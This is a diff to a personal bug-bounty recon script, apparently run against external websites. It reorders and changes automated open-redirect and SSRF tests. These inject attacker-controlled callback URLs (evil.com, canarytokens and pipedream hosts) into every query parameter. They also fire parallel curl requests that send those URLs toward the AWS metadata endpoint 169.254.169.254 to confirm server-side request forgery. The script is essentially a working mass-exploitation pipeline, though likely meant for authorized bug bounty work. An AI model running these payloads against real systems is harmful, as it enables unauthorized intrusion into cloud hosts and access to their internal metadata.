@@ -92,7 +92,7 @@ echo "[+] Combining all parameterized URLs..."
 cat results/* regex.txt loxs_param.txt | sort -u > all_param_urls
 httpx -l all_param_urls -silent -mc 200,202,201,204,205,206,207,208,301,302,403,401 > live_urls.txt
 
-cat live_urls.txt | grep -E '\?.+=.+' | grep -Ev 'woff2|woff|ttf|svg|eot|css|js|png|jpeg|gif|ico|bmp|cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|linkedin|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr|youtube|ytimg'  | sort -u  >  "$PARAM_OUT/filtered_urls_to_analyze.txt"
+cat live_urls.txt | grep -E '\?.+=.+' | grep -Ev 'woff2|woff|ttf|svg|eot|css|js|png|jpeg|gif|ico|bmp|cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|linkedin|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr|youtube|ytimg|whatsapp'  | sort -u  >  "$PARAM_OUT/filtered_urls_to_analyze.txt"
 
 cat results/* regex.txt loxs_param.txt | grep -Ei '([?&](image|file|img|url|link)=)' |  sort -u >>  "$PARAM_OUT/filtered_urls_to_analyze.txt" || true
 cat  "$PARAM_OUT/filtered_urls_to_analyze.txt" | qsreplace FUZZ | sort -u >  urls.txt
@@ -154,32 +154,8 @@ python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/xss_vibes/main.
 # echo "[*] Testing for XSS using dalfox..."
 # dalfox file "$ALLPARAMS" --skip-bav --silence -o "$OUTDIR/dalfox_xss.txt"
 
-# ----------------------------------------------
-# 3. Server-Side Request Forgery (SSRF)
-# ----------------------------------------------
-
-echo "[*] SSRF Test: Replacing parameters with Collaborator URL..."
-cat "$ALLPARAMS" | qsreplace 'https://eocl5oschaqcy19.m.pipedream.net/' | tee  -a "$OUTDIR/ssrf_urls_ffuf"
-cat "$ALLPARAMS" | qsreplace 'https://ahz0j4r17hwqqfdo3ibmaa5nl.canarytokens.com' | tee  -a "$OUTDIR/ssrf_urls_ffuf"
-
-
-echo "[*] Running FFUF for SSRF URLs..."
-ffuf -c -w "$OUTDIR/ssrf_urls_ffuf" -u FUZZ | tee -a "$OUTDIR/ssrf_ffuf_output.txt"
-
-echo "[*] SSRF Nuclei testing (Blind SSRF and Response SSRF)..."
-cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_blind.txt" -stats
-cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_response.txt" -stats
-
-cat "$ALLPARAMS" \
-| sort -u \
-| anew \
-| httpx -t 50\
-| qsreplace 'http://169.254.169.254/latest/meta-data/hostname' \
-| xargs -I % -P 25 sh -c 'resp=$(curl -ks --max-time 5 "%"); if echo "$resp" | grep -q "compute.internal"; then echo "SSRF VULN! %"; echo "SSRF VULN! %" >> "'$OUTDIR'/ssrf_aws"; fi'
-
-
-# ----------------------------------------------
-# 4. Open Redirect
+#----------------------------------------
+# 3. Open Redirect
 # ----------------------------------------------
 
 echo "[*] Filtering potential redirect parameters..."
@@ -189,13 +165,39 @@ python3 ~/techiee/bug_bounty/2_phase_recon_autom/tools/unique_urls.py
 mv unique_urls.txt "$OUTDIR/redirect_params.txt"
 
 echo "[*] Open Redirect using HTTPX..."
-cat "$OUTDIR/redirect_params.txt" | qsreplace "https://evil.com" | httpx -silent -fr -no-color -status-code | grep "\[3" >>  "$OUTDIR/open_httpx_out.txt"
+cat "$OUTDIR/redirect_params.txt" | qsreplace "https://ahz0j4r17hwqqfdo3ibmaa5nl.canarytokens.com" | httpx -silent -fr -no-color -status-code | grep "\[3" >>  "$OUTDIR/open_httpx_out.txt"
 
 
 echo "[*] Open Redirect using nuclei..."
-cat "$OUTDIR/redirect_params.txt" | qsreplace "https://evil.com" | nuclei -tags redirect -c 30 -o  "$OUTDIR/open_nuclei_out.txt" -retries 2 -stats 
+cat "$OUTDIR/redirect_params.txt" | qsreplace "https://ahz0j4r17hwqqfdo3ibmaa5nl.canarytokens.com" | nuclei -tags redirect -c 30 -o  "$OUTDIR/open_nuclei_out.txt" -retries 2 -stats 
+
+rm -f  unique_urls.txt
+
+# ----------------------------------------------
+# 4. Server-Side Request Forgery (SSRF)
+# ----------------------------------------------
+
+echo "[*] SSRF Test: Replacing parameters with Collaborator URL..."
+cat "$OUTDIR/redirect_params.txt" | qsreplace 'https://eo2efkoagj6hwzb.m.pipedream.net' | tee  -a "$OUTDIR/ssrf_urls_ffuf"
+cat "$OUTDIR/redirect_params.txt"| qsreplace 'https://ahz0j4r17hwqqfdo3ibmaa5nl.canarytokens.com' | tee  -a "$OUTDIR/ssrf_urls_ffuf"
 
 
+echo "[*] Running FFUF for SSRF URLs..."
+ffuf -c -w "$OUTDIR/ssrf_urls_ffuf" -u FUZZ | tee -a "$OUTDIR/ssrf_ffuf_output.txt"
+
+echo "[*] SSRF Nuclei testing (Blind SSRF and Response SSRF)..."
+cat "$OUTDIR/redirect_params.txt" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_blind.txt" -stats
+cat "$OUTDIR/redirect_params.txt" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_response.txt" -stats
+
+cat "$OUTDIR/redirect_params.txt" \
+| sort -u \
+| anew \
+| httpx -t 50\
+| qsreplace 'http://169.254.169.254/latest/meta-data/hostname' \
+| xargs -I % -P 25 sh -c 'resp=$(curl -ks --max-time 5 "%"); if echo "$resp" | grep -q "compute.internal"; then echo "SSRF VULN! %"; echo "SSRF VULN! %" >> "'$OUTDIR'/ssrf_aws"; fi'
+
+
+# ------
 # ----------------------------------------------
 # 5. Subdomain Takeover
 # ----------------------------------------------
